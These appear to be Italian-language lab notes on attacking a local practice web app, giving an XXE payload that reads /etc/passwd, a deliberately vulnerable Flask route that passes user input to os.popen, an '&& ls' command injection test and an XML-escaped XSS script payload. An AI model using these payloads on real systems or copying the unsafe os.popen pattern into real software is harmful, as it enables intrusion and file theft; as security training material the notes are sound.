localhost:5000

XXE INJECTION

1) prima cosa possiamo provare xxe dentro gli ordini

2) proviamo l'injection 

    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>
    <product_id> &xxe; </product_id>
    <quantity> 10 </quantity>
    <customer_name> 10 </customer_name>
    </data>

    funziona




OS COMMAND INJECTION

1) nel codice py c'è una funzione che esegue dei comandi
    @app.route('/greet', methods=['POST'])
    def greet():
        name = request.form.get('name', 'Unknown')
        cmd = f'echo Hello, {name}'
        result = os.popen(cmd).read()
        return result

2) andiamo sul sorgente degli html e cerchiamo /greet per vedere se qualche funzione fa questa richiesta post
            function showPrompt() {
            var name = prompt("Please enter your name:");
            if (name !== null) {
                fetch('/greet', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'name=' + encodeURIComponent(name)
                })
                .then(response => response.text())
                .then(greeting => {
                    document.getElementsByTagName('h1')[0].textContent = greeting;
                })
                .catch(error => console.error('Error:', error));
            }
        }

3) chiamiamo dalla console la funzione showPrompt()
   proviamo ad inviare 
    && ls

    da ZAP possiamo vedere che ritorna i file nella cartella, quindi abbiamo OS injection









XSS
1) posso effettuare un xss poich'è i valori dell'ordine sono riflessi 
    <data>
        <product_id> 10 </product_id>
        <quantity> 10 </quantity>
        <customer_name> 10 </customer_name>
    </data>

    ottengo riflesso Thank you, 10 ! Your order of 10 product(s) with ID 10 has been placed.

    provo a fare 
    <data>
        <product_id> <script> alert() </script> </product_id>
        <quantity> 10 </quantity>
        <customer_name> 10 </customer_name>
    </data>


    ma <> sono riconosciuti come tag xml e quindi non considerati come valori da riflettere

    MI SERVE RAPPRESENTARLI IN XML



    quindi posso fare:


        &lt;script&gt; alert('hello') &lt;/script&gt;


2) creo il payload
 
<data>
        <product_id> &lt;script&gt; alert('hello') &lt;/script&gt; </product_id>
        <quantity> 10 </quantity>
        <customer_name> 10 </customer_name>
</data>


